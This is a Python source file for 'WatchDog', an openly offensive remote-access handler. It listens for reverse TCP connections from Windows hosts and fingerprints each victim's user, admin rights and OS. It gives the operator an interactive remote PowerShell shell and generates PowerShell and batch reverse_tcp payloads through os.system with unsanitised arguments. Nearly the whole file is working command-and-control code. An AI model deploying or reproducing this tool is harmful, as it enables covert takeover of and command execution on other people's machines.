import os
import time
import socket
import colorama
import threading

colorama.init()

class WatchDog:
    def __init__(self):
        self.running = True
        self.WatchDog_Version = "0.1.0"

        self.WatchDog_Input_Text = f"{colorama.Fore.RED}@WatchDog>{colorama.Fore.LIGHTBLUE_EX}"
        
        self.generate = {
            "payload" : "",
            "lhost"   : "",
            "lport"   : "",
        }

        self.server = {
            "rhost"   : "",
            "rport"   : "",
            "listening"  : "false"
        }

        self.data_clients = []

        self.s_f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s_f.connect(("8.8.8.8", 80))

        

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(2)

        threading.Thread(target=self.listening).start()
        threading.Thread(target=self.test_connections).start()

        self.set_ip()
        self.startup()

    def set_ip(self):
        self.server["rhost"] = self.s_f.getsockname()[0]
        self.generate["lhost"] = self.s_f.getsockname()[0]

    def startup(self):
        print(colorama.Fore.RED)
        print(f"Well Come To WatchDog {self.WatchDog_Version}...")
        print("")
        self.start()

    def cmd_WhoAmI(self, conn):
        try:
            conn.send(bytes("whoami", "utf-8"))
            rm = conn.recv(64).decode("utf-8")
            return rm[0:-2]
        except:
            return 0
    
    def cmd_Check_Privileges(self, conn):
        conn.send(bytes("([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)", "utf-8"))
        rm = conn.recv(16).decode("utf-8")

        return rm[0:-2]
    
    def cmd_OS_name(self, conn):
        conn.send(bytes("$osInfo = Get-CimInstance Win32_OperatingSystem; $osInfo.Caption", "utf-8"))
        rm = conn.recv(32).decode("utf-8")

        return rm[0:-2]

    def test_connections(self):
        while self.running:
            time.sleep(10)
            for pp in self.data_clients:
                if not pp[5]:
                    if not self.cmd_WhoAmI(pp[0]):
                        print('\r' + ' ' * 30 + '\r', end='', flush=True)
                        print(f"{colorama.Fore.RED}[-] {colorama.Fore.LIGHTMAGENTA_EX}client has disconnected IP:{pp[1]}, User: {pp[2]}, Admin: {pp[3]}, OS: {pp[4]}{colorama.Fore.LIGHTBLUE_EX}")
                        print(self.WatchDog_Input_Text, end='', flush=True)
                        self.data_clients.remove(pp)

    def listening(self):
        while self.running:
            if self.server["listening"] == "true":
                try:
                    conn, addr = self.s.accept()
                    print('\r' + ' ' * 30 + '\r', end='', flush=True)

                    User_name = self.cmd_WhoAmI(conn)
                    Check_Privileges = self.cmd_Check_Privileges(conn)
                    Name_os = self.cmd_OS_name(conn)

                    print(f"{colorama.Fore.GREEN}[+] {colorama.Fore.LIGHTMAGENTA_EX}Client connected IP: {addr[0]}, User: {User_name}, Admin: {Check_Privileges}, OS: {Name_os}{colorama.Fore.LIGHTBLUE_EX}")
                    print(self.WatchDog_Input_Text, end='', flush=True)

                    self.data_clients.append([conn, addr[0], User_name, Check_Privileges, Name_os, False])

                except socket.timeout:
                    pass
            time.sleep(2)
        print("Server is off...")

    def sessions(self):
        client_number = 0
        print("")
        for pp in self.data_clients:
            print(f"{colorama.Fore.LIGHTMAGENTA_EX}Client {client_number} connected IP: {pp[1]}, User: {pp[2]}, Admin: {pp[3]} OS: {pp[4]}")
            client_number += 1
        print("")

    def set_server_bind(self):
        try:
            self.s.bind((self.server["rhost"], int(self.server["rport"])))
            self.s.listen()

            print("")
            print("Server is running...")
            print("")
            print(f"IP  : {self.server['rhost']}")
            print(f"PORT: {self.server['rport']}")
            print("")

        except Exception as e:
            print(f"Server Error: {e}")

    def shell(self, client_number):
        try:
            self.WatchDog_Input_Text = f"{colorama.Fore.RED}@Shell/{self.data_clients[client_number][2]}>{colorama.Fore.LIGHTBLUE_EX}"

            while True:
                print(self.WatchDog_Input_Text, end='', flush=True)
                co = input()

                if co == "exit":
                    print("Exit Shell...")
                    print("")
                    break
                elif co == "clear":
                    os.system("cls")
                    continue
                elif co == "help":
                    print("")
                    print("you can use powershell commands or")
                    print("viewscreen")
                    print("")
                    continue

                self.data_clients[client_number][0].send(bytes(co, "utf-8"))
                self.data_clients[client_number][0].settimeout(0.8)

                while True:
                    try:
                        print(self.data_clients[client_number][0].recv(16).decode("utf-8"), end="")
                    except socket.timeout:
                        break

        except:
            print("shell error")

        self.WatchDog_Input_Text = f"{colorama.Fore.RED}@WatchDog>{colorama.Fore.LIGHTBLUE_EX}"

    def start(self):
        while True:
            print(self.WatchDog_Input_Text, end="")
            command = input().lower().split(" ")

            if command[0] == "help":
                print("")
                print("generate")
                print("     payload=")
                print("          windows/powershell/reverse_tcp")
                print("          windows/batch/reverse_tcp")
                print("     lhost=")
                print("          192.168.10.1")
                print("     lport=")
                print("          5050")
                print("")
                print("<Example> generate payload=windows/powershell/reverse_tcp lhost=192.168.10.1 lport=5050")
                print("<Example> generate payload=windows/powershell/reverse_tcp lport=5050")
                print("<Example> generate payload=windows/batch/reverse_tcp lhost=192.168.10.1 lport=5050")
                print("<Example> generate payload=windows/batch/reverse_tcp lport=5050")
                print("")
                print("")
                print("")
                print("server")
                print("     rhost=")
                print("          192.168.10.1")
                print("     rport=")
                print("          5050")
                print("     listening=")
                print("          true")
                print("          false")
                print("")
                print("<Example> server rhost=192.168.10.1 rport=5050 listening=True")
                print("<Example> server rport=5050 listening=True")
                print("")
                print("")
                print("")
                print("sessions")
                print("")
                print("")
                print("")
                print("shell <client's number>")
                print("")
                print("")
            elif command[0] == "exit":
                print("")
                print("Closing Server...")
                print("")
                break
            elif command[0] == "clear":
                os.system("cls")
            elif command[0] == "generate":
                self.set_generate(self.splitlist(command))
            elif command[0] == "server":
                self.set_server(self.splitlist(command))
                self.set_server_bind()
            elif command[0] == "shell":
                if len(self.data_clients) == 0:
                    print("NO CLIENTS")
                else:
                    if len(command) > 1:
                        self.shell(int(command[1]))
            elif command[0] == "sessions":
                self.sessions()

        self.running = False

    def splitlist(self, li):
        c = []
        for pp in li:
            c.append(pp.split("="))
        return c
    
    def set_generate(self, li):
        for pp in li:
            try:
                self.generate[pp[0]] = pp[1]

            except:
                pass

        # print(f"python {self.generate["payload"]}.py {self.generate["lhost"]} {self.generate["lport"]}")
        print("")
        os.system(f"python {self.generate['payload']}.py {self.generate['lhost']} {self.generate['lport']}")
        print("")

    def set_server(self, li):
        for pp in li:
            try:
                self.server[pp[0]] = pp[1]

            except:
                pass



WatchDog()
